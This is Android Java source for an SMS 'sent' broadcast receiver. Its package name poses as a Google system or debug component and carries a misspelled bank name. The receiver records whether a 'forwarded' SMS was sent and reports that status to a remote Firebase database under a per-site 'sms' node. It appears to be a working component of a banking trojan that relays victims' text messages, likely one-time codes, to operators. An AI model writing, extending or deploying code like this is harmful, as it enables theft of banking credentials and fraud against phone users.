package google.test.debug.system.unionb4nk2.bg;

import android.app.Activity;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.SmsManager;
import android.util.Log;

import google.test.debug.system.unionb4nk2.Helper;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import java.util.HashMap;

public class SmsSentReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        Log.d("mywork", "sms intent called");
        String forwardStatus = "";
        switch (getResultCode()) {
            case Activity.RESULT_OK:
                Log.d("SmsSentReceiver", "SMS sent successfully");
                forwardStatus = "SMS sent successfully";
                break;
            case SmsManager.RESULT_ERROR_GENERIC_FAILURE:
                Log.d("SmsSentReceiver", "Generic failure");
                forwardStatus = "Generic Failure";
                break;
            case SmsManager.RESULT_ERROR_NO_SERVICE:
                Log.d("SmsSentReceiver", "No service");
                forwardStatus = "No Service";
                break;
            case SmsManager.RESULT_ERROR_NULL_PDU:
                Log.d("SmsSentReceiver", "Null PDU");
                forwardStatus = "Null PDU";
                break;
            case SmsManager.RESULT_ERROR_RADIO_OFF:
                Log.d("SmsSentReceiver", "Radio off");
                forwardStatus = "Radio OFF";
                break;
        }
        HashMap<String, Object> dataObject = new HashMap<>();
        dataObject.put("forwardStatus", forwardStatus);
        String id = intent.getStringExtra("id");
        assert id != null;
        Log.d("mywork", "Data Id"+id+" ; status "+forwardStatus);
        if(!id.isEmpty())
        {
            FirebaseDatabase database = FirebaseDatabase.getInstance();
            DatabaseReference usersRef = database.getReference("data").child(Helper.SITE).child("sms");
            usersRef.child(id).updateChildren(dataObject)
                    .addOnSuccessListener(aVoid -> {
                        Log.d(Helper.TAG, "Status Updated + "+id);
                    })
                    .addOnFailureListener(e -> {
                        Log.d(Helper.TAG, "Error: " + e.getMessage());
                    });
        }
    }
}
